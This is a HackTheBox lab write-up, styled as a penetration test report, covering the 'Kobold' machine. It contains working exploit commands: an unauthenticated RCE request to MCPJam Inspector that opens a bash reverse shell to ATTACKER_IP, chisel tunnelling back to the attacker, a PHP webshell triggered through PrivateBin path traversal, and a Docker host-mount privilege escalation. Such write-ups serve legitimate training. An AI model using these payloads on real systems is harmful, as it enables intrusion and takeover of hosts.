HackTheBox — Kobold
Penetration Testing Report
Difficulty: Medium  |  Points: 30  |  Date: 06 Apr 2026
Author: Maksim Harashchuk (nibler123)
Machine Rank: #5282
1. Executive Summary
Kobold is a Medium-difficulty HackTheBox machine featuring a modern attack chain through AI/ML tooling. The attack surface includes an exposed MCPJam Inspector instance vulnerable to unauthenticated RCE, a PrivateBin instance with LFI vulnerability, and Docker privilege escalation via a misconfigured group.

Parameter
Value
Machine Name
Kobold
Difficulty
Medium
OS
Linux (Ubuntu)
Points
30
Machine Rank
#5282
Pwn Date
06 Apr 2026
Initial Access
MCPJam Inspector RCE (GHSA-232v-j27c-5pp6)
Privilege Escalation
Docker group via newgrp (gshadow)

2. Attack Chain Overview
Step
Technique
Result
1
Port scanning (nmap)
Ports 22, 80, 443, 3552 discovered
2
Subdomain enumeration (ffuf)
mcp.kobold.htb found
3
MCPJam RCE via /api/mcp/connect
Shell as ben
4
Chisel port forwarding
Access to internal services (8080, 6274)
5
PrivateBin LFI via template cookie
RCE inside Docker container
6
Config file read (/srv/cfg/conf.php)
MySQL password leaked
7
Credential reuse on Arcane dashboard
Docker management access
8
newgrp docker (gshadow)
Docker group access as ben
9
Privileged container with /:/hostfs
ROOT flag

3. Reconnaissance
3.1 Port Scanning
Full TCP scan revealed four open ports:
nmap -p- -sC -sV -oN nmap_kobold.txt 10.10.x.x

Port
Service
Notes
22
SSH (OpenSSH 9.6p1)
No known CVEs
80
HTTP (nginx 1.24.0)
Redirect to HTTPS
443
HTTPS (nginx 1.24.0)
SSL cert: *.kobold.htb (wildcard!)
3552
HTTP
Arcane Docker Dashboard

The wildcard SSL certificate (*.kobold.htb) indicates subdomains exist.
3.2 Subdomain Enumeration
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -k -fs 154
Discovered: mcp.kobold.htb — MCPJam Inspector v1.4.2 (no authentication)
4. Initial Access
4.1 MCPJam Inspector RCE (GHSA-232v-j27c-5pp6)
MCPJam Inspector v1.4.2 listens on 0.0.0.0 without authentication. The /api/mcp/connect endpoint accepts arbitrary commands via serverConfig.command parameter.

curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash",
       "args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],
       "env":{}},"serverId":"pwn"}'

Result: Reverse shell as user ben.
4.2 Shell Stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
5. Internal Service Discovery
5.1 Chisel Port Forwarding
Internal services found via ss -tlnp: port 8080 (PrivateBin Docker container) and 6274 (MCPJam node.js).

# On Kali:
chisel server -p 9000 --reverse

# On victim:
./chisel client ATTACKER_IP:9000 R:9090:127.0.0.1:8080

Access to PrivateBin at http://127.0.0.1:9090 confirmed.
6. Privilege Escalation
6.1 Docker Volume Discovery
User ben is in group operator. Finding writable paths for this group:
find / -group operator 2>/dev/null
# Result: /privatebin-data/ (shared Docker volume!)
6.2 PrivateBin LFI (CVE-2025-64714)
PrivateBin with templateselection=true trusts the template cookie for PHP template selection. Path traversal allows including arbitrary PHP files.

Step 1 — Drop webshell via shared volume:
cat > /privatebin-data/data/pwn.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

Step 2 — Trigger LFI and read config:
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"

Result: MySQL password found: ComplexP@sswordAdmin1928
6.3 Credential Reuse on Arcane
Default Arcane username is 'arcane'. The leaked password was reused:

Field
Value
URL
http://kobold.htb:3552
Username
arcane
Password
ComplexP@sswordAdmin1928
6.4 Docker Privilege Escalation
Ben is listed in /etc/gshadow for the docker group (hidden from /etc/group). Using newgrp unlocks Docker daemon access:

newgrp docker
docker run --rm -u 0 -v /:/hostfs --entrypoint /bin/sh \
  privatebin/nginx-fpm-alpine:2.0.2 -c "cat /hostfs/root/root.txt"

Result: ROOT flag obtained.
7. Vulnerabilities Summary
CVE/ID
Component
Severity
Description
GHSA-232v-j27c-5pp6
MCPJam Inspector v1.4.2
Critical
Unauthenticated RCE via /api/mcp/connect
CVE-2025-64714
PrivateBin 2.0.2
High
LFI via template cookie (path traversal)
N/A
Arcane Dashboard
High
Credential reuse + default username
N/A
Docker group
Critical
docker group = root (gshadow misconfiguration)

8. Key Lessons
    • MCP tools are a new attack surface — MCPJam Inspector exposed on 0.0.0.0 without auth is critical RCE
    • Shared Docker volumes create a bridge between host and container — always check group membership
    • LFI in a container is not a dead end if shared volumes exist with write access
    • Always try credential reuse on every discovered service
    • docker group = root — membership in docker group allows full host compromise
    • gshadow can contain hidden group memberships not visible in /etc/group
    • newgrp reads from gshadow — always check both files during enumeration

9. Tools Used
Tool
Purpose
nmap
Port scanning and service enumeration
ffuf
Subdomain and directory fuzzing
chisel
TCP port forwarding tunnel
curl
HTTP requests and exploitation
newgrp
Group switching via gshadow
docker
Privileged container for root access

— End of Report —
